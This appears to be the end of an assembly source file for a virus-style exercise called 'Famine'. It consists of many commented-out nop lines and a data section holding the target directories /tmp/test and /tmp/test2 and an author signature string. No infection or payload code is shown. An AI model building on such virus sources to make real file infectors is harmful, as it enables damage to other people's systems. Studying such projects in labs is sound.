	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop

dir1        db  "/tmp/test", 0
dir1Len    equ $ - dir1
dir2        db  "/tmp/test2", 0
dir2Len    equ $ - dir2
signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
signature_len equ $ - signature
_end: